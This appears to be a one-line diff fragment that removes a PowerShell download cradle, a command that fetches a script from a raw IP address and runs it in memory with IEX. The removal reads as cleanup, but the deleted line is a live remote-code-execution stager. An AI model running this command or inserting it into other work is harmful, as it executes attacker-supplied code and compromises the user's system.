@@ -1,1 +1,0 @@
-IEX ((new-object net.webclient).downloadstring('http://23.227.202.198:443/two'))
